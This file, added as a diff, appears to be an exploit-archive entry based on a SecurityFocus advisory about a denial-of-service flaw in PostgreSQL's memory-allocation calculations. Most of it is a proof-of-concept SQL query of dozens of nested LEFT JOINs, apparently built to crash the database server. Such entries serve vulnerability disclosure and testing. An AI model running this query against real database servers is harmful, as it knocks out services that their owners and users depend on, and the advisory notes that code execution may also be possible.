@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/38619/info
+
+PostgreSQL is prone to a remote denial-of-service vulnerability because it fails to properly validate user-supplied data before using it in memory-allocation calculations.
+
+An attacker can exploit this issue to cause the affected application to crash. Due to the nature of this issue, remote code execution may be possible; this has not been confirmed. 
+
+SELECT * from B AS alias0 LEFT JOIN BB AS alias1 LEFT JOIN B
+AS alias2 LEFT JOIN A AS alias3 LEFT JOIN AA AS alias4 LEFT JOIN B
+AS alias5 ON alias4.int_key = alias5.int_key ON alias3.int_key =
+alias4.int_key LEFT JOIN AA AS alias6 LEFT JOIN A AS alias7 ON
+alias6.int_key = alias7.int_key LEFT JOIN BB AS alias8 ON alias7.int_key
+= alias8.int_key ON alias3.int_key = alias8.int_key LEFT JOIN AA AS
+alias9 ON alias6.int_key = alias9.int_key ON alias2.int_key =
+alias8.int_key LEFT JOIN BB AS alias10 LEFT JOIN AA AS alias11 LEFT
+JOIN B AS alias12 ON alias11.int_key = alias12.int_key ON alias10.int_key
+= alias11.int_key ON alias9.int_key = alias10.int_key ON alias1.int_key =
+alias8.int_key LEFT JOIN BB AS alias13 LEFT JOIN A AS alias14
+LEFT JOIN AA AS alias15 LEFT JOIN A AS alias16 ON alias15.int_key =
+alias16.int_key LEFT JOIN B AS alias17 ON alias15.int_key =
+alias17.int_key ON alias14.int_key = alias16.int_key LEFT JOIN AA AS
+alias18 ON alias14.int_key = alias18.int_key LEFT JOIN B AS alias19 ON
+alias15.int_key = alias19.int_key LEFT JOIN AA AS alias20 ON
+alias16.int_key = alias20.int_key ON alias13.int_key = alias19.int_key
+LEFT JOIN A AS alias21 ON alias13.int_key = alias21.int_key ON
+alias3.int_key = alias17.int_key LEFT JOIN B AS alias22 ON alias7.int_key
+= alias22.int_key LEFT JOIN A AS alias23 ON alias20.int_key =
+alias23.int_key LEFT JOIN A AS alias24 ON alias14.int_key =
+alias24.int_key LEFT JOIN BB AS alias25 LEFT JOIN BB AS alias26 ON
+alias25.int_key = alias26.int_key LEFT JOIN A AS alias27 LEFT JOIN
+A AS alias28 ON alias27.int_key = alias28.int_key LEFT JOIN B AS alias29
+LEFT JOIN BB AS alias30 LEFT JOIN B AS alias31 LEFT JOIN A AS
+alias32 LEFT JOIN B AS alias33 ON alias32.int_key = alias33.int_key LEFT
+JOIN A AS alias34 ON alias32.int_key = alias34.int_key ON alias31.int_key
+= alias33.int_key ON alias30.int_key = alias33.int_key ON alias29.int_key
+= alias34.int_key ON alias27.int_key = alias34.int_key LEFT JOIN AA AS
+alias35 LEFT JOIN A AS alias36 ON alias35.int_key = alias36.int_key ON
+alias34.int_key = alias36.int_key LEFT JOIN A AS alias37 ON
+alias33.int_key = alias37.int_key ON alias25.int_key = alias32.int_key
+LEFT JOIN A AS alias38 ON alias37.int_key = alias38.int_key ON
+alias15.int_key = alias37.int_key ON alias0.int_key = alias9.int_key 
